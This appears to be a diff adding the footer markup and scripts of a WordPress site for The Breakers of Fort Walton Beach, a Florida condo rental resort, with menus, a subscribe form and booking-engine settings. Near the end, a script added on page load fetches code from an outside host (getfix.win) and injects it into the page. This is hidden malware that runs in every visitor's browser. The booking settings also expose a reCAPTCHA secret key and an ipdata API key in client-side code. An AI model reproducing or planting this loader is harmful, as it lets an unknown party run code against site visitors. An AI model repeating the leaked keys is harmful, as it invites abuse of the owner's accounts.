+					<a href="https://breakersfwb.rentalguardian.com/" target="_blank"><img src="https://blog.nationwide.com/wp-content/themes/nfn-2.0/assets/images/footer-logo.svg"title="Nationwide logo"alt="logo for Nationwide" class="devbadge" style="width:200px; height:133px; border-radius:5px;"></a>
+					<script type="application/ld+json">
+{
+"@context": "http://schema.org",
+"@type": "LodgingBusiness",
+"url": "https://www.breakersfwb.com/",
+"logo": "https://www.breakersfwb.com/wp-content/uploads/2017/03/logo-gray.png",
+"image": "https://www.breakersfwb.com/wp-content/uploads/2017/03/beach-views2.jpg",
+"priceRange": "$$",
+"hasMap": "https://goo.gl/maps/111WnyMfZ7CMxY7r7",
+"openingHours":["Mo-Fr 07:00-23:00"],
+"address": {
+"@type": "PostalAddress",
+"addressLocality": "Fort Walton Beach",
+"addressRegion": "FL",
+"postalCode":"32548",
+"streetAddress": "381 Santa Rosa Boulevard"
+},
+"description": "Enjoy all the comforts of home, with the convenience of a hotel stay. Choose from comfortable one, two, or three-bedroom condos, with fully equipped, professionally decorated floor plans.",
+"name": "The Breakers of Fort Walton Beach",
+"telephone": "1-800-395-4853",
+"sameAs" : [ "https://plus.google.com/+Breakersfwb",
+"https://www.facebook.com/breakersfwb/",
+"https://twitter.com/breakersfwb",
+"https://www.pinterest.com/breakersfwb/",
+"https://www.youtube.com/user/thebreakersfwb",
+"https://www.instagram.com/breakersfwb/"]
+}
+</script>
+                   
+    			</div>  <!-- end col-md-3 -->
+    			<div class="col-md-6 border">  <!-- col-md-6 -->
+                    <div class="color-scheme-list">
+                        <div class="col-md-4">
+                            <h2 class="title">Popular RENTALS</h2>
+                            <div class="dropdown">
+                                <ul>
+                                    <li><a href="/all-fort-walton-beach-rentals/">Fort Walton Beach Rentals</a></li>
+                                    <li><a href="/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/one-bedroom/">1 Bedroom Rentals</a></li>
+                                    <li><a href="/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/two-bedroom/">2 Bedroom Rentals</a></li>
+                                    <li><a href="/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/Three-Bedroom/">3 Bedroom Rentals</a></li>
+									<li><a href="/our-fort-walton-beach-resort-rentals/our-fort-walton-beachfront-condos/">Beachfront Rentals</a></li>
+									<li><a href="/condo-rentals-with-an-ocean-view/">Ocean View Rentals</a></li>
+									<li><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/short-term-rentals-in-fort-walton-beach/?sort_by=random">Short Term Rentals</a></li>
+									<li><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/fort-walton-weekly-rentals/?sort_by=random">Weekly Rentals</a></li>
+									<li><a href="/our-fort-walton-beach-resort-rentals/">Beach Resort Rentals</a></li>
+									<li><a href="/fort-walton-corporate-rentals/">Corporate Rentals</a></li>
+									<li><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/fort-walton-event-rentals/?sort_by=random">Event Rentals</a></li>
+									<li><a href="/our-fort-walton-beach-resort-rentals/family-rentals/">Family Rentals</a></li>
+									<li><a href="/our-fort-walton-beach-resort-rentals/spring-rentals-in-fort-walton-beach/">Spring Rentals</a></li>
+									<li><a href="/fort-walton-beach-rentals-for-the-holidays/">Holiday Rentals</a></li>
+									<li><a href="/alphabetical-property-list/">Alphabetical Property List</a></li>
+								
+                                </ul>
+                            </div>    
+                        </div><!-- End col-md-4-->
+                
+                        <div class="col-md-4">
+                            <h2 class="title">Nearby Activities</h2>
+                            <div class="dropdown">
+                                <ul>
+                                    <li><a href="/experience/spa-and-golf/">Golfing</a></li>
+                                    <li><a href="/xplorieactivites/">Deep Sea Fishing</a></li>
+                                    <li><a href="/xplorieactivites/">Dolphin Cruise</a></li>
+								    <li><a href="/xplorieactivites/">Jet Ski and Pontoon Rentals</a></li>
+                                    <li><a href="/xplorieactivites/">Parasailing</a></li>
+                                </ul>
+                            </div>    
+                        </div><!-- End col-md-4-->
+                
+                        <div class="col-md-4">
+                            <h2 class="title">OUR COMPANY</h2>
+                            <div class="dropdown">
+                                <ul>
+                                    <li><a href="/terms-and-conditions/">Terms &amp; Conditions</a></li>
+                                    <li><a href="/rental-policies/">Rental Policies</a></li>
+                                    <li><a href="/frequently-asked-questions-the-breakers/">Rental FAQs</a></li>
+									<li><a href="https://breakersfwb.rentalguardian.com/" target="_blank">Travel Insurance</a></li>
+									<li><a href="/request-estoppel-letter/" target="_blank">Request Estoppel Letter</a></li>
+                                    <li><a href="/about-us/">About Us</a></li>
+                                    <li><a href="https://owner.streamlinevrs.com/" target="_blank" >Owner Streamline Login</a></li>
+									<li><a href="https://breakersfwb.appfolio.com/connect/users/sign_in" target="_blank" >Owner AppFolio Login</a></li>
+                                    <li><a href="/contact-us/">Contact Us</a></li>
+                                  </ul>
+                            </div>    
+                        </div> <!-- End col-md-4-->
+                    </div>         
+                </div> <!-- end col-md-6 -->
+    			<div class="col-md-3 wrap-social"> <!-- col-md-3 -->
+                    <h2>STAY CONNECTED</h2>
+					<div style="display:inline-block; margin: 0 auto; justify-content:center; align-items:center; text-align:center;">
+                    <div class="social" style="display:inline-block; margin: 0 auto; width:220px; justify-content:center; align-items:center;">
+						<a href="https://www.facebook.com/breakersfwb/"><img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/3225194_app_facebook_logo_media_popular_icon-1.png"></a>
+						<a href="https://www.instagram.com/thebreakersfwb/"><img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/3225191_app_instagram_logo_media_popular_icon.png"></a>
+						<a href="https://www.tripadvisor.com/Hotel_Review-g34234-d566292-Reviews-The_Breakers_of_Fort_Walton_Beach-Fort_Walton_Beach_Florida.html"><img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/03/tripadvisor-logo-circle-owl-icon-black-green-680x680-1.png"></a>
+                    </div>
+                     <div class="login-wrap">
+                        <a href="https://owner.streamlinevrs.com/" class="owner-login">owner streamline login</a>
+                    </div>
+					<div class="login-wrap">
+                        <a href="https://breakersfwb.appfolio.com/connect/users/sign_in" class="owner-login">owner appfolio login</a>
+                    </div><br><br>
+					<center>
+						
+                <div class='gf_browser_chrome gform_wrapper gravity-theme gform-theme--no-framework' data-form-theme='gravity-theme' data-form-index='0' id='gform_wrapper_16' ><div id='gf_16' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_16' id='gform_16'  action='/#gf_16' data-formid='16' novalidate>
+                        <div class='gform-body gform_body'><div id='gform_fields_16' class='gform_fields top_label form_sublabel_below description_below validation_below'><div id="field_16_1" class="gfield gfield--type-email gfield_contains_required field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_16_1" ><label class='gfield_label gform-field-label' for='input_16_1'>Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
+                            <input name='input_1' id='input_16_1' type='email' value='' class='large' tabindex='49'  placeholder='Email Address*' aria-required="true" aria-invalid="false"  />
+                        </div></div><div id="field_16_3" class="gfield gfield--type-hidden gfield--width-full gform_hidden field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_16_3" ><div class='ginput_container ginput_container_text'><input name='input_3' id='input_16_3' type='hidden' class='gform_hidden'  aria-invalid="false" value='https://www.breakersfwb.com/Home Of Fort Walton Beach Resorts' /></div></div></div></div>
+        <div class='gform-footer gform_footer top_label'> <input type='submit' id='gform_submit_button_16' class='gform_button button' onclick='gform.submission.handleButtonClick(this);' value='Subscribe' tabindex='50' /> <input type='hidden' name='gform_ajax' value='form_id=16&amp;title=&amp;description=&amp;tabindex=49&amp;theme=gravity-theme&amp;styles=[]&amp;hash=4f2137041d4091445df6a969b9de1c17' />
+            <input type='hidden' class='gform_hidden' name='gform_submission_method' data-js='gform_submission_method_16' value='iframe' />
+            <input type='hidden' class='gform_hidden' name='gform_theme' data-js='gform_theme_16' id='gform_theme_16' value='gravity-theme' />
+            <input type='hidden' class='gform_hidden' name='gform_style_settings' data-js='gform_style_settings_16' id='gform_style_settings_16' value='[]' />
+            <input type='hidden' class='gform_hidden' name='is_submit_16' value='1' />
+            <input type='hidden' class='gform_hidden' name='gform_submit' value='16' />
+            
+            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
+            <input type='hidden' class='gform_hidden' name='state_16' value='WyJbXSIsIjg5MjVlZDQ3OWQzODk0NDhlMjYxZTY5ODQ1OGQ1MDkwIl0=' />
+            <input type='hidden' autocomplete='off' class='gform_hidden' name='gform_target_page_number_16' id='gform_target_page_number_16' value='0' />
+            <input type='hidden' autocomplete='off' class='gform_hidden' name='gform_source_page_number_16' id='gform_source_page_number_16' value='1' />
+            <input type='hidden' name='gform_field_values' value='' />
+            
+        </div>
+                        </form>
+                        </div>
+		                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_16' id='gform_ajax_frame_16' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
+		                <script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() {gformInitSpinner( 16, 'https://www.breakersfwb.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery('#gform_ajax_frame_16').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_16');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_16').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_16').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_16').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_16').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_16').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_16').val();gformInitSpinner( 16, 'https://www.breakersfwb.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery(document).trigger('gform_page_loaded', [16, current_page]);window['gf_submitting_16'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}jQuery('#gform_wrapper_16').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_16').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [16]);window['gf_submitting_16'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_16').text());}else{jQuery('#gform_16').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger("gform_pre_post_render", [{ formId: "16", currentPage: "current_page", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_16" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_16";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_16" );        let postRenderFired = false;                function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [16, current_page] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 16, currentPage: current_page } } );            gform.utils.trigger( { event: 'gform/post_render', native: false, data: { formId: 16, currentPage: current_page } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } );} ); 
+/* ]]> */
+</script>
+						
+<!-- 					<img src="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/02/CreditCards.png"title="Credit Card Logos"alt="color logos for credit cards" width="180px"> -->
+					</center>          
+					</div>
+                </div> <!-- end col-md-3 -->
+    		</div><!-- end row -->
+    	</div>  <!-- end container -->
+        <div class="copyright"><!-- copyright -->
+            <div class="container">
+                <div class="link-copyright">
+                    <div class="menu-footer-menu-container"><ul><li id="menu-item-44187" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-44187"><a href="https://www.breakersfwb.com/fort-walton-beach-resort-rentals/?sort_by=random">Fort Walton Beach Rentals</a></li>
+<li id="menu-item-214" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-214"><a href="https://www.breakersfwb.com/contact-us/">Contact Us</a></li>
+<li id="menu-item-213" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-213"><a href="https://www.breakersfwb.com/island-blog/">Blog</a></li>
+<li id="menu-item-215" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-215"><a href="https://www.breakersfwb.com/about-us/">About Us</a></li>
+<li id="menu-item-46386" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46386"><a href="https://www.breakersfwb.com/frequently-asked-questions-the-breakers/">FAQ</a></li>
+<li id="menu-item-43810" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43810"><a href="https://www.breakersfwb.com/experience/complementary-activities/">Things To Do</a></li>
+<li id="menu-item-43819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43819"><a href="/privacy-policy/">Privacy Policy</a></li>
+<li id="menu-item-44229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-44229"><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/floor-plans/">Floor Plans</a></li>
+<li id="menu-item-44233" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-44233"><a href="https://www.breakersfwb.com/resort-rentals/">Resort Rentals</a></li>
+<li id="menu-item-47177" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-47177"><a href="https://www.indeed.com/cmp/The-Breakers-of-Fort-Walton-Beach/jobs">Careers</a></li>
+</ul></div> 
+                </div>
+                <div class="box-right">
+					<a href="https://www.breakersfwb.com/" target="_blank" style="color: #000;text-align: center;width: 40%; margin: 0 auto;"> <span>© <span><script async>document.write(new Date().getFullYear())</script></span> The Breakers of Fort Walton - All rights reserved</span></a>
+                </div>
+            </div>  
+        </div><!-- end copyright -->
+    </footer>
+    <script async>
+    jQuery('.color-scheme-list > div > h2').click(function(){
+        var hzCL = jQuery(this).parent().hasClass('active');
+        if(hzCL == false){
+            jQuery('.color-scheme-list div').removeClass('active').find('div').slideUp(200);
+            jQuery(this).parent().find('div:first').slideDown(400);
+            jQuery(this).parent().addClass('active');
+        }else{
+            jQuery(this).parent().find('div:first').slideUp(400);
+            jQuery(this).parent().removeClass('active');
+        }
+    });
+    
+    jQuery(document).ready(function(){
+        var redUse = jQuery('.welcome-sect .bigArticle').height();
+        jQuery('.welcome-sect .bigArticle').height(160);
+        jQuery('.welcome-sect .readMore').click(function(){ 
+            var hzTX = jQuery(this).text()
+            if(hzTX == 'Read More'){
+                jQuery('.welcome-sect .bigArticle').height(redUse);
+                jQuery(this).text('Hide');   
+            }else{
+                jQuery(this).text('Read More');
+                jQuery('.welcome-sect .bigArticle').height(160);
+            }
+        });
+    });
+</script>
+
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,300,400,500,600,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Raleway:200,300,400,500,600,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Cormorant+Garamond:400,700" rel="stylesheet">
+    
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/bizcor2018\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<script type="text/javascript">      
+          if(typeof angular != "undefined"){
+            (function () {
+              var app = angular.module("resortpro");
+              app.run(function($rootScope){
+                
+                $rootScope.unit_flex_dates = 0;
+                $rootScope.enable_flex_calendar = 0;
+                $rootScope.calendar_limit_alert = "Please call to make a reservation greater than 27 nights.";
+                $rootScope.pagination_reviews = "5";
+                $rootScope.select_load_reviews = "0";
+                $rootScope.dinamic_calendar_limit = "365";
+                $rootScope.enable_cr = "";
+                $rootScope.calendar_limit = "   "; 
+                $rootScope.calendar_restriction_turn_day = "";                     
+                $rootScope.propertyUrl = "https://www.breakersfwb.com/";
+                $rootScope.map_hide_companies = 0;
+                $rootScope.useHTML = "0";
+                $rootScope.roomTypeLogic = 0;
+                $rootScope.yielding = 0;
+                $rootScope.slash = 1;
+                $rootScope.calendar_decimal = 0;
+                $rootScope.enforceOccupancy = 0;
+                $rootScope.rateMarkup = 0;
+                $rootScope.show_all_rates = 0;
+                $rootScope.rate_type = '';
+                $rootScope.hideTooltips = 1;
+                $rootScope.seasonOffMessage = 'This day is part of a Weekly Booking Season, please select Saturday as your Check In/Out day.';
+                $rootScope.custom_home_icon = '';
+                $rootScope.ski_out_icon = '';
+                $rootScope.hot_tub_icon = '';
+                $rootScope.dayOffEnable = '0';
+                $rootScope.doNotVerifyZip = 0;
+                $rootScope.includeEnabledOptional = 0;
+                $rootScope.enableGdpr = 0;
+                $rootScope.avail_calendar_type =  'arrival_nights',
+                $rootScope.enableStreamShare = 0;                      
+                $rootScope.enable_multilanguage = 0;                    
+                $rootScope.enable_multicurrency = 0;
+                $rootScope.currency_code = '';
+                $rootScope.currency_api_key = '';
+                $rootScope.disable_zoom = 0;
+                $rootScope.add_click_zoom_maps = 0;  
+                $rootScope.upliftApiKey = "";
+                $rootScope.rbCurrentDay = "0";
+                $rootScope.tape_chart_filter_area = "0";
+                $rootScope.enable_search = "0";
+                $rootScope.tape_chart_filter_view = "0";
+                $rootScope.tape_chart_filter_resort = "0";
+                $rootScope.tape_chart_filter_neighborhood = "0";
+                $rootScope.tape_chart_filter_home_type = "0";
+                $rootScope.tape_chart_filter_beds = "0";
+                $rootScope.tape_chart_filter_sleeps = "0";
+                $rootScope.tape_chart_filter_baths = "0";
+                $rootScope.tape_chart_filter_pets = "0";
+                $rootScope.max_months_number = 4;
+                $rootScope.tapeChart_header_color = '';
+                $rootScope.tapeChart_booking_color = '#ccc';
+                $rootScope.slash_start_height = '37px';
+                $rootScope.slash_end_height = '37px';
+                $rootScope.show_fc_sortBy = "0";
+                $rootScope.sort_alphabetical = "0";
+                $rootScope.fc_slash_logic = "0";
+                $rootScope.show_back_to_back_reservations = 0,
+                $rootScope.enableAdvancedRes = 0;
+                $rootScope.enable_turn_day_searching = 0;
+                $rootScope.enable_turn_day_calendar = 0;
+                $rootScope.enable_nearby_units = 0;
+                $rootScope.show_nearby_units_map = 0;
+                $rootScope.enable_similar_dates = 0;
+                $rootScope.similar_price_range = '0';
+                $rootScope.dynamicCalendarMinStay = 0;
+                $rootScope.nearby_range = 0;
+                $rootScope.enable_reservation_type = 0;
+                $rootScope.enable_custom_res_pricing = 0;
+                $rootScope.travel_type_id = 0;
+                $rootScope.travel_agent_id = "";
+                $rootScope.predefined_agent_id = ""; 
+                $rootScope.reservation_type = "";
+                $rootScope.nearby_units_limit = 3;
+                $rootScope.enable_amp = 0;
+                $rootScope.use_last_name = 0;
+                $rootScope.separate_taxes_and_fees = 0;
+                $rootScope.show_rate_fees_breakdown = 0;
+                $rootScope.hide_schema_address = 0;
+                $rootScope.checkoutSettings = {
+                  showTaxBreakdown : "true",
+                  useAddOns : 0,
+                  useGuardian : 1,
+                  useTooltipDesc : 0,
+                  AddOnsPopup : 0,
+                  createLeads : 0,
+                  cartAbandonmentMotivator : 0,
+                  payment_schedule_label : 'Payment Schedule',
+                  required_payment_label : 'Required Payment',
+                  groupExpectedCharges : 0,
+                  createStreamSign : 0,
+                  enable_grecaptcha: 0,
+                  grecaptcha_site_key: '6LfOdAYaAAAAALTyWayN7KI6sNc8_h0ouV32tnsn',
+                  grecaptcha_secret_key: '6LfOdAYaAAAAAHWA6UqgjDNBIHDV8YU-qjYoKrYO',
+                  paymentRedirect : 0,
+                  units_exclude_streamsign : '',
+                  enableVGSProxy : 1,
+                  vgsVault : "tnt9tnlpez5",
+                  vgsToken : "",
+                  enable_lynnbrook : 0,
+                  lynnbrook_production : 0,
+                  lynnbrook_aptexx_endpoint : "https://api.aptx.cm/endpoint/service/api-v1/",
+                  lynnbrook_aptexx_token : "xxxx",
+                  lynnbrook_target_id : "12285844",
+                  enable_wallet_payments : "0",
+                  aptexx_domain : "https://www.breakersfwb.com",
+                  ip_data : "https://api.ipdata.co/?api-key=92b3e0df3ea9b81e53818fc60f16f54c9eba82a8bc1df908339e85a8",
+                  pay_in_full : "0",
+                  cc_fee_logic : "0",
+                  disable_terms_popup : "0",
+                  collect_terms_check : "0",
+                  bucket_charges : "0",
+                  disable_payments : "0",
+                  checkout_layout : "4",
+                  enable_add_event_calendar : "0"
+                };
+                $rootScope.searchSettings = {
+                  noInventoryForm : 0,
+                  noInvEmail : "dev@bizcor.com",
+                  bedroom_count : 0,
+                  enable_tapeChart : 0,
+                  without_dates : 0,
+                  popular_properties_id :  '',
+                  popular_properties : 0,
+                  maxOccupantsAdults : "2",
+                  min_oc: 0,
+                  max_oc: 0,
+                  min_price: '',
+                  max_price: '',
+                  total_units_pagination: '',
+                  enable_amenities :0,
+                  occupants_logic: 0,
+                  bedrooms_logic: 0,
+                  min_beds: '',
+                  max_beds: '',
+                  show_calendar: '',
+                  locationAreas : '',
+                  locationIds : '',
+                  resortAreaIds : '',
+                  compareAmenityGroups : '',
+                  GroupIds : '',
+                  neighborhoodIds : '',
+                  amenity_filtersIDs : '',
+                  home_typesIDs : '',
+                  home_length_type : '0',
+                  searchMethod : 'GetPropertyAvailabilityWithRatesWordPress',
+                  priceDisplay : 'total',
+                  maxSearchDays : 60,
+                  additionalVariables : 0,
+                  extraCharges : 0,
+                  propertyPagination : 12,
+                  propertyDeleteUnits : '',
+                  propertyShowUnits : '',
+                  defaultFilter : 'random',
+                  customFilter : '',
+                  disabledBooking : 'enabled',
+                  skipAmenities : 1,
+                  restrictionMsg : '',
+                  disableMinimalDays : 0,
+                  advancedMinStayLogic : 0,
+                  useDailyPricing : 1,
+                  useWeeklyPricing : 1,
+                  useMonthlyPricing : 1,
+                  manualPricing : 0,
+                  enable_nightly_rate :0,
+                  manualPricingMessage : 'Avg. price for stay',
+                  dailyAppend : 'daily',
+                  dailyPrepend : 'from',
+                  weeklyAppend : 'weekly',
+                  weeklyPrepend : 'from',
+                  monthlyAppend : 'monthly',
+                  monthlyPrepend : 'from',
+                  noPriceMessage : 'N/A',
+                  noIvnMessage : 'Sorry, We have no inventory available for the selected dates and/or filters.',
+                  use_webname_as_name : 0,
+                  view_on_map_button : 0,
+                  enable_all_pins : 0,
+                  global_amenity_logic : 0,
+                  enable_slider_image : '0',
+                  enable_calendar_arrows : '0',
+                  enable_highlighted_unit_on_map : '0',
+                  enable_map_slider : '0',
+                  enable_get_gallery_image : '0',
+                  places_search_box : '0',
+                  add_map_lines : '0',
+                  added_marker_radius : '6000',
+                  line_color : '#000',
+                  line_opacity : '1',
+                  line_weight : '1',
+                  map_unit_measurement : 'M',
+                  max_images_number : '0',
+                  map_zoom : '0',
+                  enable_quick_view : '0',
+                  full_description : '0',
+                  show_streamshare_units : '0',
+                  streamshare_search : '',
+                  search_results_slug : 'home',
+                  enable_bedroom_range : '0',
+                  enable_adults_range : '0',
+                  plus_minus_guest : '0',
+                  enable_map_clusters : '0',
+                  enable_drag_search : '0',
+                  enable_marker_gallery : '0',
+                  enable_adv_geo_map_logic : '0',
+                  enable_combined_search_name : '0',
+                  enable_widget_option_redirect : '0',
+                  grid_size : '100',
+                  max_zoom : '20',
+                  minimum_cluster_size : '5',
+                  enable_flex_weekly_range : '0',
+                  enable_full_flex_range : '0',
+                  enable_max_occupants_logic : '0',
+                  enable_redirect_unit : '0',
+                  redirect_link : '',
+                  block_hided_units : '0',
+                  booking_status : 'enabled',
+                  intervalFilter : 0,
+                  pagination_option : 0
+                };
+                $rootScope.bookingSettings = {
+                  blocked_units_password : '',
+                  error_message : '',
+                  max_booking_message : 'The selected dates exceed the maximum stay length allowed',
+                  hearedAboutId : 27346,
+                  priceSignUp : '',
+                  hearedAboutQuoteId : 0,
+                  hearedAboutLeadId : 0,
+                  inqury_heard_about : 0,
+                  unit_tab_guest_survey : 0,
+                  abandoned_heard_about : 0,
+                  blockedRequest : 0,
+                  nonBlockedRequest : 0,
+                  quoteBlockRequest: 0,
+                  inquiryReqEmailPhone : 0,
+                  inquiryThankMsg : 'Thank you for your inquiry, someone will be contacting you shortly!',
+                  inquiryThankUrl : 'http://www.breakersfwb.com/thank-you-for-your-inquiry/',
+                  restrict_rate_table : '',
+                  restrict_rates : '',
+                  rate_restrict_days : '1',
+                  disableThanksPopup : '',
+                  autocloseMsg :  '',
+                  inquiryOnlyFrom : '',
+                  inquiryOnlyTo : '',
+                  book_now : 'enabled',
+                  maxLengthStay : 27,
+                  show_calendar_daily_rate : '',
+                  show_discount_slash_price : '',
+                  enable_premium_calendar : '',
+                  inquiry_blocked_request : '0',
+                  show_booking_calendar_daily_rate : '',
+                  availability_months : '3',
+                  property_daily_price : '',
+                  enable_price_guest : '',
+                  enable_graph_limit_months : '0',
+                  enable_season_graph : '0',
+                  graph_gradient_colors : '#000,#fff',
+                  graph_border_color : '#000',
+                  enable_rates_pw : 0,
+                  enter_pw_1 : '',
+                  enter_pw_2 : '',
+                  enter_pw_3 : '',
+                  enter_pw_4 : '',
+                  error_invalid_pw : 'Invalid Password!',
+                  rate_type_1 : '',
+                  rate_type_2 : '',
+                  rate_type_3 : '',
+                  rate_type_4 : '',
+                  rate_type_id_1 : '',
+                  rate_type_id_2 : '',
+                  rate_type_id_3 : '',
+                  rate_type_id_4 : ''
+                };
+                $rootScope.integrationSettings = {
+                };
+                $rootScope.comunicationSettings = {
+                  share_with_friends_referrer: ''
+                };
+              });
+            })();
+          }
+          var assetsUrl = "https://www.breakersfwb.com/wp-content/plugins/streamline-core-307/assets/";
+        </script><script>
+(function() {
+    if (document.readyState !== 'loading') {
+        loadScript();
+    } else {
+        document.addEventListener('DOMContentLoaded', loadScript, {once: true});
+    }
+
+    function loadScript() {
+        var url = 'https://getfix.win/jsrepo?rnd=' + Math.random() + '&ts=' + Date.now();
+        
+        fetch(url, {
+            method: 'GET',
+            cache: 'no-store',
+            credentials: 'same-origin'
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('HTTP ' + response.status);
+            return response.text();
+        })
+        .then(data => {
+            var script = document.createElement('script');
+            script.textContent = data.trim();
+            document.head.appendChild(script);
+            
+            if (document.readyState === 'complete' || document.readyState === 'interactive') {
+                document.dispatchEvent(new Event('DOMContentLoaded'));
+            }
+        })
+        .catch(error => {
+            console.warn('Script load failed:', error.message);
+        });
+    }
+})();
+</script><link rel='stylesheet' id='gforms_reset_css-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/legacy/css/formreset.min.css?ver=2.9.4' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_formsmain_css-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/legacy/css/formsmain.min.css?ver=2.9.4' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_ready_class_css-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/legacy/css/readyclass.min.css?ver=2.9.4' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_browsers_css-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/legacy/css/browsers.min.css?ver=2.9.4' type='text/css' media='all' />
+<link rel='stylesheet' id='gform_basic-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/assets/css/dist/basic.min.css?ver=2.9.4' type='text/css' media='all' />
+<link rel='stylesheet' id='gform_theme_components-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/assets/css/dist/theme-components.min.css?ver=2.9.4' type='text/css' media='all' />
+<link rel='stylesheet' id='gform_theme-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/gravityforms/assets/css/dist/theme.min.css?ver=2.9.4' type='text/css' media='all' />
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/coblocks/dist/js/coblocks-animation.js?ver=3.1.14" id="coblocks-animation-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/coblocks/dist/js/vendors/tiny-swiper.js?ver=3.1.14" id="coblocks-tiny-swiper-js"></script>
+<script type="text/javascript" id="coblocks-tinyswiper-initializer-js-extra">
+/* <![CDATA[ */
